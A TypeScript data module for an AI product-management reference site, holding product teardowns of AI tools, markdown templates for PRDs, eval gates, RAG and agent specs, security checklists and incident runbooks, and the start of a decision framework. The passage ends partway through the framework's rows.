export interface PlaybookTemplate {
  id: string;
  title: string;
  shortTitle: string;
  category: 'Specification' | 'Evaluation' | 'Economics' | 'Architecture' | 'Governance' | 'Operations';
  description: string;
  whenToUse: string;
  markdown: string;
}

export interface DecisionFramework {
  id: string;
  title: string;
  subtitle: string;
  takeaway: string;
  headers: string[];
  rows: string[][];
}

export type InterviewCategory =
  | 'Product Sense & AI UX'
  | 'Technical Architecture (RAG, Evals & Agents)'
  | 'Metrics, Experimentation & Execution'
  | 'Strategy, Moats & Pricing';

export interface InterviewQuestion {
  id: string;
  category: InterviewCategory;
  difficulty: 'L5 Senior PM' | 'L6 Staff PM' | 'Principal / AI Lead';
  question: string;
  whatInterviewersLookFor: string;
  commonTrap: string;
  staffAnswerBlueprint: string[];
}

export type GlossaryCategory =
  | 'LLM Mechanics'
  | 'Economics & Latency'
  | 'Evals & Quality'
  | 'RAG & Context'
  | 'Agents & Safety'
  | 'Strategy & Governance';

export interface GlossaryEntry {
  term: string;
  category: GlossaryCategory;
  definition: string;
  pmImplication: string;
}

export interface ProductTeardown {
  id: string;
  product: string;
  company: string;
  category:
    | 'Coding & DevTools'
    | 'Answer & Research Engine'
    | 'Knowledge Synthesis'
    | 'Customer Operations'
    | 'Vertical Enterprise AI'
    | 'Workflow Automation';
  headline: string;
  coreWedge: string;
  uxSignature: string;
  architectureStack: string;
  moatAndFlywheel: string;
  pricingAndMargins: string;
  failureModeMitigation: string;
  stealThisPattern: string;
}

export const PRODUCT_TEARDOWNS: ProductTeardown[] = [
  {
    id: 'cursor-ide',
    product: 'Cursor',
    company: 'Anysphere',
    category: 'Coding & DevTools',
    headline: 'Winning developers by cutting verification time below typing time via shadow workspaces and multi-line Tab diffs.',
    coreWedge: 'Daily IDE coding flow where context switching to a browser chatbox broke flow state.',
    uxSignature: 'Predictive multi-line Tab ghost diffs across open cursors plus inline Cmd+K edits and multi-file Composer review diffs.',
    architectureStack: 'Local codebase Merkle-tree incremental embeddings + AST symbol indexing + fast speculative autocomplete model + frontier Composer router + background shadow LSP lint checks.',
    moatAndFlywheel: 'Captures millisecond Tab accept/partial-accept/reject telemetry across real multi-file diffs, creating unmatched post-training preference pairs.',
    pricingAndMargins: 'Hybrid Seat + Pooled Credits ($20/mo Pro includes 500 fast frontier requests, then queue fallback or usage-based Pro+ billing).',
    failureModeMitigation: 'Validates candidate code edits silently against TypeScript/LSP compilers in a hidden shadow workspace before surfacing diffs.',
    stealThisPattern: 'Run cheap deterministic linters, schemas, or typechecks in the background before displaying an AI suggestion so users inspect clean drafts.',
  },
  {
    id: 'perplexity-search',
    product: 'Perplexity',
    company: 'Perplexity AI',
    category: 'Answer & Research Engine',
    headline: 'Replacing ten blue links with claim-cited synthesized answers backed by live web hybrid retrieval.',
    coreWedge: 'High-intent knowledge lookup where Google SEO clutter slowed answers and ungrounded chat hallucinated facts.',
    uxSignature: 'Numbered inline claim pills linked straight to source favicons, curated Deep Research reports, and follow-up question threads.',
    architectureStack: 'Multi-hop query decomposer + low-latency web crawl index + hybrid BM25 & dense search + cross-encoder reranker + frontier synthesis.',
    moatAndFlywheel: 'High-velocity freshness index, query-reformulation logs, and source authority click signals sharpen retrieval relevance daily.',
    pricingAndMargins: 'Freemium funnel into $20/mo Pro (quota on Pro/Deep searches) + Enterprise Pro + native related-follow-up sponsored placement.',
    failureModeMitigation: 'Forces claim-level numbered attribution in generation prompts and lowers citation fabrication via strict passage extraction.',
    stealThisPattern: 'Attach inline numbered citation pills next to factual sentences so a skeptic can verify the claim in under 2 seconds.',
  },
  {
    id: 'notebooklm-synthesis',
    product: 'Google NotebookLM',
    company: 'Google Labs',
    category: 'Knowledge Synthesis',
    headline: 'Turning deliberate source restriction into an enterprise trust superpower.',
    coreWedge: 'Students, analysts, and researchers drowning in 20+ PDFs, transcripts, and slides who feared generic LLM open-web hallucinations.',
    uxSignature: 'Two-pane Source Binder + Grounded Notebook Canvas, click-to-jump passage citations, and the viral dual-host Audio Overview studio.',
    architectureStack: 'Long-context Gemini ingestion with source-anchored chunk offsets + strict closed-world system prompt + specialized multi-speaker dialogue synthesis pipeline.',
    moatAndFlywheel: 'Sticky project binders holding curated user knowledge graphs, saved notes, and multi-format study outputs.',
    pricingAndMargins: 'Workspace / Consumer Gemini tier ecosystem pull-through, amortizing heavy long-context prefill via implicit context caching.',
    failureModeMitigation: 'Explicitly refuses when uploaded sources lack the answer rather than interpolating from unverified pretraining memory.',
    stealThisPattern: 'Lock sensitive research workflows strictly to uploaded tenant docs and make every citation scroll straight to the exact source highlight.',
  },
  {
    id: 'sierra-fin-agents',
    product: 'Sierra & Intercom Fin',
    company: 'Sierra / Intercom',
    category: 'Customer Operations',
    headline: 'Monetizing autonomous customer resolution via policy-locked agent constellations.',
    coreWedge: 'High-volume Tier-1/Tier-2 customer support tickets and order modifications with clear resolution metrics.',
    uxSignature: 'Instant policy-grounded resolution inside live chat/voice widgets with seamless transcript handoff to human agents on escalation.',
    architectureStack: 'Orchestrator agent + specialized sub-agents paired with brand-policy rules engines, authenticated CRM/billing tool contracts, and deterministic API guards.',
    moatAndFlywheel: 'Deep integration into ERP/refund/subscription APIs plus per-tenant ticket escalation outcomes create high switching costs.',
    pricingAndMargins: 'Outcome-based pricing (~$0.99 per verified resolution or resolved workflow), aligning software spend directly to saved support labor.',
    failureModeMitigation: 'Combines strict deterministic authorization rules for refunds/mutations with 72-hour non-reopen outcome auditing.',
    stealThisPattern: 'Never give an autonomous support model raw write discretion—wrap mutations in deterministic server-side policy validators.',
  },
  {
    id: 'linear-triage',
    product: 'Linear Triage & Product Intelligence',
    company: 'Linear',
    category: 'Workflow Automation',
    headline: 'Zero-prompt ambient AI embedded invisibly inside high-speed issue queues.',
    coreWedge: 'Engineering and PM leads spending hours weekly deduplicating bug reports, assigning teams, and applying labels.',
    uxSignature: 'Quiet inline chips ("Possible Duplicate · Suggest Priority: Urgent · Assign: Payments") confirmed or dismissed in one keystroke.',
    architectureStack: 'Lightweight classification & semantic similarity embeddings over workspace history, CODEOWNERS, and recent merged PR titles.',
    moatAndFlywheel: 'Every single Triage Accept/Modify click creates ultra-clean workspace-specific routing labels.',
    pricingAndMargins: 'Included inside core high-margin SaaS workspace plans by running ultra-cheap mini/embedding models rather than heavy chat loops.',
    failureModeMitigation: 'Never mutates priority or closes duplicates silently without explicit 1-click user confirmation in Triage queue.',
    stealThisPattern: 'Eliminate the prompt box entirely for repetitive categorization—pre-compute subtle suggestions where the queue work already happens.',
  },
  {
    id: 'harvey-hebbia-legal',
    product: 'Harvey & Hebbia Matrix',
    company: 'Harvey / Hebbia',
    category: 'Vertical Enterprise AI',
    headline: 'Multi-document matrix extraction and zero-data-retention trust for regulated workflows.',
    coreWedge: 'Associates & PE analysts auditing diligence data rooms across hundreds of leases, credit agreements, and filings.',
    uxSignature: 'Structured spreadsheet Matrix view (rows = documents, columns = extracted clauses) with clickable page-level PDF snippets per cell.',
    architectureStack: 'Parallel fan-out map-reduce extraction workers + layout-aware PDF OCR + strict schema normalization + Zero Data Retention (ZDR) enclaves.',
    moatAndFlywheel: 'Firm-specific playbooks, vetted legal precedents, and strict partner-grade evaluation rubrics.',
    pricingAndMargins: 'High-ACV enterprise seat + data-room volume contracts sustaining healthy margins on multi-thousand-dollar institutional workflows.',
    failureModeMitigation: 'Each matrix cell links to exact verbatim PDF coordinates and outputs an explicit "NOT FOUND IN DOC" token instead of guessing.',
    stealThisPattern: 'Replace single-thread Q&A with a side-by-side structured verification Matrix whenever users analyze >5 documents.',
  },
];

export const PLAYBOOK_TEMPLATES: PlaybookTemplate[] = [
  {
    id: 'ai-native-prd',
    title: 'AI-Native PRD & System Specification Template',
    shortTitle: 'AI-Native PRD',
    category: 'Specification',
    description:
      'Replace deterministic feature specs with probabilistic SLAs, structured output schemas, abstention contracts, error-cost asymmetry, and golden eval release gates.',
    whenToUse: 'Before writing any engineering tickets for an LLM, RAG, or agent-powered feature.',
    markdown: `# AI-Native PRD: [Feature / Capability Name]
**Owner:** [PM Name] | **Eng Lead:** [Name] | **Target Release:** [Quarter] | **Model Tier:** [Fast / Balanced / Frontier]

## 1. Problem Framing & AI Suitability Justification
- **User Job-to-be-Done:** [What workflow friction are we eliminating?]
- **Why Deterministic Code / Classic ML Is Insufficient:** [Explain why regex/rules/XGBoost cannot solve unstructured ambiguity here.]
- **Architecture Rung Selected:** [Single-Shot Extraction | Hybrid RAG | Bounded Multi-Step Agent]
- **Human Verification Time:** [Must be significantly faster to verify than to author from scratch — e.g., < 45 seconds]

## 2. Error-Cost Asymmetry & Trust Calibration
| Failure Mode | User / Business Severity | Mitigation / UX Guardrail |
|---|---|---|
| **False Positive** (AI asserts/acts wrongly) | [e.g., High — breaks user trust / corrupts CRM] | [Require explicit citation + 1-click Reject/Edit] |
| **False Negative** (AI misses valid signal) | [e.g., Medium — user falls back to manual] | [Abstain cleanly with "No evidence found"] |
| **Irreversible Side Effect** | [e.g., Critical — external email / financial write] | [Mandatory Human-in-the-Loop (HITL) diff approval] |

## 3. System Specification & Output Contract
- **Primary Trigger & UX Pattern:** [Inline ghost suggestion | Artifact canvas | Background triage | Scoped side-panel]
- **System Prompt Version Pin:** \`v1.0.0\` (Stored in versioned prompt registry alongside code)
- **Context Isolation:** Untrusted user/document input MUST be wrapped in explicit XML boundaries (\`<untrusted_input>\`) separate from system instructions.
- **Structured Output Schema (JSON):**
\`\`\`json
{
  "decision": "FLAG | PASS | NO_EVIDENCE",
  "confidence_band": "HIGH | MEDIUM | LOW",
  "citations": [{"doc_id": "string", "excerpt": "string"}],
  "summary": "string"
}
\`\`\`
- **Explicit Abstention Rule:** If retrieved evidence is missing or contradictory, return \`"decision": "NO_EVIDENCE"\` — NEVER extrapolate or fabricate policy IDs.

## 4. Latency & Unit Economics Budget
- **TTFT Target (P50 / P95):** [< 400ms / < 900ms]
- **End-to-End SLA (P95):** [< 3.5s]
- **Token Budget per Request:** [Max 4,500 input tokens | Max 350 output tokens | Reasoning effort: Low]
- **Prefix Caching Assumption:** [>= 75% static prefix cache hit rate]
- **Blended Cost Ceiling:** [$0.008 / run | < $1.80 COGS / active seat / month]
- **Circuit Breaker:** [Hard per-tenant daily spend cap + automatic graceful fallback to fast-tier or cached mode]

## 5. Golden Eval Release Gate (Ship / No-Ship)
- **Golden Dataset Size:** [Minimum 120 stratified production-representative cases]
- **Tier-1 Code Assertions (100% blocking):** Valid JSON schema, zero ungrounded citations, latency < SLA, max token ceiling respected.
- **Tier-2 Calibrated LLM Judge:** Faithfulness >= 96%, Task Rubric Pass >= 90% (Judge TPR >= 88%, TNR >= 88% vs. SME labels).
- **Tier-3 Red-Team Gate:** 100% pass on indirect prompt injection, tenant ACL isolation, and PII leak tests.

## 6. Implicit Telemetry & Continuous Improvement Loop
- **Events Tracked:** \`ai_suggestion_shown\`, \`ai_accepted_unchanged\`, \`ai_edited_diff\`, \`ai_rejected_reason\`, \`ai_regenerated\`.
- **Weekly Error Analysis:** Every Friday, triage top 25 high-edit or downvoted traces and promote edge cases into the Golden Eval set.`,
  },
  {
    id: 'golden-eval-spec',
    title: 'Golden Eval Dataset & LLM-as-a-Judge Calibration Spec',
    shortTitle: 'Golden Eval Spec',
    category: 'Evaluation',
    description:
      'Blueprint for building a stratified golden evaluation dataset, mixing Tier-1 deterministic code graders with calibrated Tier-2 binary LLM judges.',
    whenToUse: 'Whenever replacing subjective "vibe checks" with an automated CI release gate.',
    markdown: `# Golden Evaluation & Judge Calibration Spec
**Product Surface:** [Feature Name] | **Eval Owner (PM):** [Name] | **SME Reviewers:** [Names]

## 1. Stratified Golden Dataset Composition (Target: N = 150 Cases)
| Slice / Bucket | % Share | Count | Purpose | Gate Threshold |
|---|---|---|---|---|
| **Core Happy Path** | 35% | 53 | Baseline functional quality on common queries | >= 95% |
| **Boundary & Multi-Constraint** | 30% | 45 | Nuanced policy exceptions, multi-hop joins, date math | >= 88% |
| **Missing Data / Abstention** | 20% | 30 | Incomplete context where model MUST say "I don't know" | >= 95% |
| **Adversarial & Safety Edge** | 15% | 22 | Prompt injection, ACL boundary probes, malformed JSON | **100% Blocking** |

## 2. Tiered Grading Architecture
### Tier 1: Deterministic Code Assertions (Fast, $0, 100% Reliable)
- [ ] Schema validates against strict Pydantic / Zod contract
- [ ] Every cited \`doc_id\` matches an ID actually present in the ACL-filtered retrieval payload
- [ ] Numeric calculations match source fields within 0.01 tolerance
- [ ] Output length and latency stay under configured ceiling

### Tier 2: Binary LLM-as-a-Judge Rubrics (Avoid 1–5 Likert Scales!)
Each judge evaluates **one atomic criterion** with a binary \`PASS / FAIL\` verdict and mandatory reasoning chain before verdict:
1. **Faithfulness Judge:** Does every factual claim in \`summary\` appear verbatim or directly entailed in \`<retrieved_context>\`? (\`PASS\` / \`FAIL\`)
2. **Policy Completeness Judge:** Did the output identify every applicable blocker without inventing unstated policies? (\`PASS\` / \`FAIL\`)

## 3. Judge Calibration Protocol (Validating the Judge Against Humans)
Before trusting any LLM judge in CI:
1. Have 2 domain SMEs independently label a 60-trace calibration split (\`PASS\` / \`FAIL\`) and resolve disagreements.
2. Run the candidate judge prompt on the same 60 traces.
3. Compute **True Positive Rate (TPR)** and **True Negative Rate (TNR)**:
   - **Target Bar:** \`TPR >= 88%\` and \`TNR >= 88%\` (Cohen's Kappa >= 0.78).
   - If \`TNR < 85%\`, the judge is too lenient (rubber-stamping hallucinations) -> tighten few-shot \`FAIL\` counterexamples.

## 4. CI/CD Promotion Rules
- Any prompt, model, chunker, or retrieval PR runs the Golden Suite automatically.
- **No-Ship Rule:** A candidate build CANNOT promote if aggregate pass rate drops > 1.5%, ANY Adversarial/Safety slice fails, or cost/run increases > 15% without PM sign-off.`,
  },
  {
    id: 'unit-economics-sheet',
    title: 'AI SaaS Unit Economics, Token COGS & Hybrid Pricing Worksheet',
    shortTitle: 'Unit Economics Sheet',
    category: 'Economics',
    description:
      'Model input/output token asymmetry, prompt cache hit rates, tiered routing, P95 power-user cohorts, and margin-safe hybrid monetization.',
    whenToUse: 'Before committing to a model tier, pricing model, or "unlimited AI" promise.',
    markdown: `# AI Unit Economics & Margin Protection Worksheet
**SKU / Plan Tier:** [e.g., Pro Plan @ $49/seat/mo] | **Target Software Gross Margin:** >= 75%

## 1. Per-Request Inference Anatomy
- **Static Prefix Tokens (System + Tools + Few-Shot):** [e.g., 2,800 tokens]
- **Dynamic Input Tokens (Retrieved Context + User Turn):** [e.g., 1,200 tokens]
- **Expected Visible Output Tokens:** [e.g., 350 tokens]
- **Hidden Reasoning / Thinking Tokens (if reasoning model):** [e.g., 0 or 600 tokens — billed at OUTPUT rate!]
- **Prefix Cache Hit Rate Assumption:** [e.g., 80% on static prefix]

## 2. Model Routing Split
| Intent / Complexity Tier | Traffic Share | Model Assigned | Est. Cost / Request | P95 TTFT |
|---|---|---|---|---|
| **Tier A: Routine / Classification / Triage** | 70% | Fast / Small Tier | $0.0008 | 310ms |
| **Tier B: Multi-Doc Synthesis / Complex** | 25% | Balanced Tier | $0.0065 | 620ms |
| **Tier C: Deep Planning / Escalation** | 5% | Frontier Reasoning | $0.0320 | 1,450ms |
| **Blended Weighted Cost / Request** | **100%** | — | **$0.0038** | — |

## 3. Cohort Distribution Stress Test (Never Model Only the Mean!)
| Customer Cohort | Monthly Runs / Seat | Blended AI COGS / Seat | Gross Margin @ $49/mo | Action Needed |
|---|---|---|---|---|
| **P50 Median User** | 400 runs | $1.52 | 96.9% | Healthy |
| **P80 Active User** | 1,100 runs | $4.18 | 91.5% | Healthy |
| **P95 Power User (3.2x vol)** | 3,200 runs | $12.16 | 75.2% | Acceptable |
| **P99 Heavy Automation Outlier** | 12,000 runs | $45.60 | **6.9% (Danger!)** | **Metered credit pool + soft throttle** |

## 4. Packaging & Margin Guardrails
- **Value Metric:** [Seat + Included Monthly AI Workflow Credits, e.g., 1,500 credits/seat]
- **Overage Mechanism:** [Auto-fallback to Fast Model OR metered credit top-up pack — never hard-block mid-task without warning]
- **Non-AI COGS Included:** [Vector DB storage + reranker API + observability trace storage ~= $0.45/seat/mo]`,
  },
  {
    id: 'rag-architecture-spec',
    title: 'Enterprise Hybrid RAG, Chunking & ACL Architecture Spec',
    shortTitle: 'RAG Architecture Spec',
    category: 'Architecture',
    description:
      'Production blueprint covering structure-aware parsing, metadata enrichment, pre-retrieval ACL filtering, BM25 + dense hybrid RRF, cross-encoder reranking, and citation enforcement.',
    whenToUse: 'When building knowledge copilots, support search, or enterprise Q&A over private documents.',
    markdown: `# Enterprise Hybrid RAG Architecture Spec
**Corpus Scope:** [e.g., Confluence, Notion, PDFs, Zendesk] | **Freshness SLA:** [< 5 min sync]

## 1. Ingestion, Parsing & Structure-Aware Chunking
- **Parsing Rules:** Preserve Markdown headings, table headers, and code blocks as atomic structures (never split mid-table!).
- **Chunk Sizing:** [Target 350–550 tokens with 15% overlap, bounded by section headers]
- **Contextual Breadcrumb Header:** Prepend \`[Source > Folder > Doc Title > H2 Section | Updated: YYYY-MM-DD]\` to EVERY chunk before embedding.
- **Metadata Schema:** \`tenant_id\`, \`acl_group_ids[]\`, \`source_type\`, \`effective_date\`, \`is_archived\`, \`canonical_url\`.

## 2. Security-First Retrieval Pipeline (Zero ACL Leakage!)
1. **Mandatory Pre-Filter:** Apply \`tenant_id == user.tenant_id AND acl_group_ids INTERSECTS user.groups\` BEFORE similarity scoring (never post-filter top-K!).
2. **Hybrid Search + Reciprocal Rank Fusion (RRF):**
   - **Dense Vector Search:** Captures semantic intent ("PTO rollover rules").
   - **BM25 Sparse Keyword Search:** Captures exact error codes, SKUs, acronyms, and legal clause IDs (\`ERR_4092\`).
   - **Candidate Pool:** Fetch top 40 dense + top 40 BM25 -> fuse via RRF.
3. **Cross-Encoder Reranker:** Score top 40 fused candidates against the query and pass only **Top 5–8 highest-signal chunks** into the LLM prompt.

## 3. Generation, Grounding & Freshness Rules
- **Recency / Authority Tie-Breaker:** Filter out \`is_archived = true\` by default; instruct generator to prioritize newer \`effective_date\` when policies conflict.
- **Inline Provenance:** Require bracketed citations \`[doc_id#section]\` validated post-generation so UI renders clickable verified deep links.
- **Retrieval vs. Generation Diagnosis Split:** Track \`Recall@8\` (did the right chunk get retrieved?) separately from \`Faithfulness\` (did the LLM stick strictly to retrieved chunks?).`,
  },
  {
    id: 'agent-mcp-contract',
    title: 'Multi-Agent Orchestration, MCP Tool Schema & HITL Gate Spec',
    shortTitle: 'Agent & MCP Spec',
    category: 'Architecture',
    description:
      'Design reliable tool-calling workflows using deterministic state-machine guardrails, MCP tool schemas, idempotency keys, and risk-tiered Human-in-the-Loop checkpoints.',
    whenToUse: 'Whenever an AI system moves beyond single-turn read answers to calling external APIs or multi-step execution.',
    markdown: `# Agentic Workflow & MCP Tool Contract
**Workflow Name:** [e.g., Tier-2 Support Resolution & Billing Credit Agent] | **Max Step Budget:** [8 steps]

## 1. Compounding Reliability Math & Architecture Choice
- **Rule of Thumb:** If per-step accuracy is \`p = 0.94\` over \`N = 10\` open-loop steps, baseline success is \`0.94^10 = 53.9%\`.
- **Workflow Decomposition:** Collapse predictable linear steps into deterministic orchestration code; reserve LLM reasoning ONLY for ambiguous branching and synthesis.

## 2. Tool Risk Classification & HITL Matrix (via Model Context Protocol)
| Tool Name | Action Type | Blast Radius | Idempotency Key Required? | Approval Policy |
|---|---|---|---|---|
| \`crm.get_customer_history\` | Read-Only | None | No | Auto-Execute |
| \`kb.search_policies\` | Read-Only | None | No | Auto-Execute |
| \`jira.create_draft_ticket\` | Reversible Write | Low | Yes (\`trace_id + step\`) | Auto-Execute + 1-Click Undo |
| \`billing.issue_refund\` | **Irreversible External Write** | **High ($)** | **Yes (Mandatory)** | **HITL Pause + Visual Diff Card** |
| \`email.send_to_customer\` | **Irreversible External Comms** | **High (Brand)** | **Yes (Mandatory)** | **HITL Approve / Edit** |

## 3. MCP Tool Definition Best Practices (Error-Proofing for the Model)
- **Clear Semantic Descriptions:** Explain *when* to call the tool, *when NOT* to call it, and valid enum constraints.
- **Actionable Error Payloads:** When a tool fails, return structured corrective guidance (e.g., \`{"error": "INVALID_DATE", "hint": "Use ISO-8601 YYYY-MM-DD"}\`), never raw stack traces.
- **Loop & Spend Circuit Breakers:** Hard cap at \`max_steps = 8\`, \`max_retries_per_tool = 2\`, and \`max_trace_cost = $0.25\`. On breach, pause cleanly and escalate trace summary to human operator.`,
  },
  {
    id: 'enterprise-trust-checklist',
    title: 'Enterprise AI Security, Red-Teaming, ZDR & Compliance Checklist',
    shortTitle: 'Enterprise Trust',
    category: 'Governance',
    description:
      'Complete procurement-ready checklist covering Zero Data Retention (ZDR), indirect prompt injection defense, PII redaction, audit logs, and EU AI Act risk tiering.',
    whenToUse: 'Preparing an AI product for enterprise InfoSec reviews, SOC2 audits, or regulated customer deployments.',
    markdown: `# Enterprise AI Security & Governance Readiness Checklist

## 1. Data Privacy & Model Provider Contracts
- [ ] **Zero Data Retention (ZDR) & No Training:** Contractual guarantee with model APIs that customer prompts/completions are NEVER used for foundation model training and are not retained beyond inference (or encrypted ephemeral cache only).
- [ ] **Regional Data Residency:** EU/US inference endpoint pinning (\`eu-central\`, \`us-east\`) enforced per tenant configuration.
- [ ] **PII / Secret Pre-Redaction:** Deterministic regex + NER scrubber strips SSNs, credit cards, and API tokens prior to outbound LLM calls where not strictly required.

## 2. Adversarial Threat Defense
- [ ] **Control vs. Data Plane Separation:** System policies and tool schemas are separated from untrusted documents/emails/web pages via structured delimiters.
- [ ] **Indirect Prompt Injection Suite:** Automated red-team test suite covering hidden HTML comments, malicious PDF text, and tool-argument smuggling.
- [ ] **Least-Privilege Tool Scoping:** Agent sessions execute strictly under the invoking user's OAuth/RBAC token — NEVER a shared super-admin service key.
- [ ] **Output Exfiltration Guard:** Block markdown image links or external webhook URLs generated from untrusted context.

## 3. Auditability & Regulatory Alignment
- [ ] **Immutable Action Audit Log:** Every AI recommendation and tool execution logs \`user_id\`, \`prompt_version\`, \`model_id\`, \`retrieved_doc_ids\`, \`human_approver_id\`, and \`timestamp\`.
- [ ] **EU AI Act / NIST AI RMF Classification:** Documented risk tier (Minimal / Limited Transparency / High-Risk), human oversight mechanism, and bias/fairness eval cadence.
- [ ] **Customer Kill Switch:** Tenant-level toggle to disable AI features instantly without breaking core deterministic SaaS workflows.`,
  },
  {
    id: 'error-analysis-ritual',
    title: 'Weekly AI Trace Triage & Error Analysis Ritual Playbook',
    shortTitle: 'Error Analysis Ritual',
    category: 'Operations',
    description:
      'The single highest-leverage weekly PM habit: systematic open coding of production failures into an actionable taxonomy that drives engineering sprints.',
    whenToUse: 'Every week once your AI feature has real user traffic or dogfooding traces.',
    markdown: `# Weekly AI Error Analysis Ritual (60 Minutes Every Friday)
**Attendees:** AI PM (Lead), Staff ML/AI Engineer, Domain SME / Designer

## Step 1: Pull a High-Signal Sample (50 Traces) — Do Not Sample Uniformly!
- **20 traces** with explicit negative feedback (thumbs down, bug report, retry/regenerate).
- **20 traces** with high implicit user edit distance or abandoned AI drafts.
- **10 random baseline traces** to catch silent hallucinations users didn't notice.

## Step 2: Open-Code Every Failure (No Blame, Concrete Labels)
| Trace ID | Failure Stage | Root Cause Tag | Severity | Fix Category |
|---|---|---|---|---|
| \`tr_8912\` | Retrieval | Missed exact SKU (\`AX-402\`) — dense only | High | Add BM25 hybrid search |
| \`tr_8944\` | Chunking | Split table header from row values | High | Markdown table-aware chunker |
| \`tr_8960\` | Generation | Guessed policy instead of abstaining | Critical | Tighten abstention few-shot + eval |
| \`tr_8977\` | UX / Latency | User abandoned at 4.8s TTFT | Medium | Route simple queries to Fast tier |

## Step 3: Quantify Top Failure Clusters & Stack-Rank Sprint Work
- Count frequency x severity across the 50 traces (Pareto rule: 2 root causes usually drive 70%+ of failures!).
- **Convert Top 10 Failures into Permanent Eval Cases:** Every verified bug gets added to the Golden Eval suite before the fix PR merges.

## Step 4: Ship & Verify Hill-Climbing Delta
- Measure before/after pass rate on the updated Golden Eval set and confirm edit-distance drop in next week's production telemetry.`,
  },
  {
    id: 'incident-runbook',
    title: 'Production AI Drift, Hallucination & Cost Spike Incident Runbook',
    shortTitle: 'Incident Runbook',
    category: 'Operations',
    description:
      'Step-by-step Sev-1/Sev-2 response guide when a silent model snapshot update, infinite agent loop, or bad retrieval sync breaks production quality or spikes spend.',
    whenToUse: 'During live AI outages, quality regressions, or runaway token cost alerts.',
    markdown: `# Production AI Incident Response Runbook

## Severity Classification
- **SEV-1 (Immediate Page):** Cross-tenant ACL data leak, unauthorized external write/financial action, PII exposure, or >5x sustained spend burn.
- **SEV-2 (Urgent):** Faithfulness/JSON validity drops >10%, P95 latency >3x SLA, or upstream provider outage.

## Minute 0–10: Immediate Containment (Stop the Bleeding First!)
1. **Verify Feature Flags / Circuit Breakers:**
   - If SEV-1 safety/ACL issue -> Flip tenant or global AI kill switch to deterministic fallback immediately.
   - If runaway agent loop -> Enforce hard \`max_steps\` & per-tenant rate cap; pause async queues.
   - If upstream provider model regression -> Failover router to pinned backup model snapshot (\`model_snapshot_id\`).
2. **Freeze Prompt & Index Deployments:** Pause ongoing KB re-indexing or prompt rollouts.

## Minute 10–45: Isolate Root Cause Layer
Check telemetry dashboards in exact pipeline order:
1. **Provider / Model Drift:** Did an unpinned alias (e.g., \`-latest\`) silently change behavior?
2. **Context / Retrieval Sync:** Did a broken ingestion job wipe metadata, drop ACL filters, or index stale docs?
3. **Prompt / Tool Regression:** Did a recent PR alter XML delimiters, tool descriptions, or output schemas?
4. **Adversarial / Loop Pattern:** Is one tenant or malformed doc triggering infinite tool retries?

## Post-Incident Hardening (Within 48 Hours)
- Pin immutable dated model snapshots in production configs.
- Add the exact failing trace(s) to the blocking Tier-1/Tier-2 Golden Eval CI gate.
- Publish blameless postmortem documenting time-to-detect, blast radius, and automated guardrail added.`,
  },
  {
    id: 'multi-agent-orchestration-spec',
    title: 'Multi-Agent Orchestration & Handoff Contract Template',
    shortTitle: 'Multi-Agent Spec',
    category: 'Architecture',
    description:
      'Blueprint for bounding supervisor-worker fan-out, typed JSON handoff contracts, least-privilege write separation, and partial-failure graceful degradation.',
    whenToUse: 'Before introducing 2+ cooperating agents or parallel tool-calling workers into production.',
    markdown: `# Multi-Agent Orchestration Spec: [Workflow Name]
**Topology Selected:** [Single Agent + Tools | Deterministic DAG | Orchestrator + Parallel Read Workers | Scoped Handoff Swarm]

## 1. Why Multi-Agent Isolation Is Required
- **Context / Tool Separation Justification:** [Why cannot a single model with scoped tools execute this cleanly?]
- **Read vs. Write Privilege Split:** [List which sub-agents have read-only tools vs. which gated node performs mutations.]

## 2. Typed JSON Handoff Contract (Ban Raw Transcript Passing)
- Required handoff payload fields: task_id, target_worker, allowed_tools[], max_tool_calls, timeout_ms, structured_brief.
- Strict ban on passing parent conversational history > 1,500 tokens downstream.

## 3. Execution Budgets & Graceful Partial Failure
- **Per-Worker Timeout & Max Steps:** [e.g., max_steps: 4 | timeout_ms: 8,000]
- **Partial Degradation Policy:** [Render completed worker panels + badge naming timed-out source + 1-click Retry.]
- **Hard Spend Circuit Breaker:** [Max $0.12 per orchestrated user workflow run; abort & escalate above cap.]`,
  },
  {
    id: 'ai-launch-readiness-checklist',
    title: 'Shadow-to-GA AI Launch & Canary Rollout Checklist',
    shortTitle: 'AI Launch Checklist',
    category: 'Operations',
    description:
      '4-stage launch gate covering Offline Evals, Dark Shadow Mode, Tenant-Clustered Canary Experiments, and GA Kill-Switch Readiness.',
    whenToUse: 'For every 0-to-1 launch or major model/prompt upgrade going out to live customers.',
    markdown: `# Shadow-to-GA AI Launch Checklist: [Feature Name]

## Stage 1 — Offline Golden Eval & Red-Team Gate
- [ ] Minimum 120+ stratified golden eval cases passing Tier-1 schema checks (100%) & calibrated Tier-2 judge (>= 92%).
- [ ] Adversarial red-team suite (indirect injection, markdown exfil, tenant ACL isolation) at 100% pass.

## Stage 2 — Dark Shadow Mode (Production Traffic Validation)
- [ ] Mirror 10–25% live payloads silently without user exposure for >= 48 hours.
- [ ] Verify real P95 input/output token distributions, KV cache hit rate, P95 latency, and P99 whale COGS.

## Stage 3 — 5% Tenant-Clustered Canary + Novelty Holdout
- [ ] Randomize strictly at Workspace/Tenant level (never split individuals inside the same customer org).
- [ ] Confirm Day-1 onboarding starter pills eliminate blank-box paralysis (Time-to-First-Magic < 45s).
- [ ] Define auto-rollback triggers: error rate > 2%, edit-heavy rejection > 45%, or daily COGS spike > 1.8x model budget.

## Stage 4 — General Availability & Operations
- [ ] Verify 1-click feature-flag kill switch degrades cleanly to manual workflow or deterministic fallback.
- [ ] Schedule recurring Friday error-analysis trace review (25 sampled bad/edited traces/week).`,
  },
];

export const DECISION_FRAMEWORKS: DecisionFramework[] = [
  {
    id: 'suitability-ladder',
    title: 'The 5-Rung AI Suitability & Architecture Ladder',
    subtitle: 'Always choose the simplest, cheapest, most verifiable architecture that clears your quality bar.',
    takeaway:
      'Never reach for an autonomous agent when a single structured prompt or deterministic SQL rule solves 98% of the problem at 1/20th the latency and cost.',
    headers: ['Rung', 'Architecture Pattern', 'Best Suited Problem Profile', 'Latency & Cost', 'Primary Failure Mode'],
    rows: [
      [
        'Rung 1',
        'Deterministic Rules / SQL',
        'Exact business logic, tax math, permissions, strict workflows',
        '<10ms · ~$0',
        'Brittle on unstructured natural language',
      ],
      [
        'Rung 2',
        'Classical ML (XGBoost / Logistic)',
        'Tabular churn scoring, fraud detection, forecasting with labeled rows',
        '<30ms · Tiny',
        'Cannot reason across free-form text or generalize zero-shot',
      ],
      [
        'Rung 3',
        'Single-Shot Prompt + Schema',
        'Summarization, classification, entity extraction, copy drafting',
        '300ms–2s · Low',
        'Lacks private live facts; needs strict output & abstention specs',
      ],
      [
        'Rung 4',
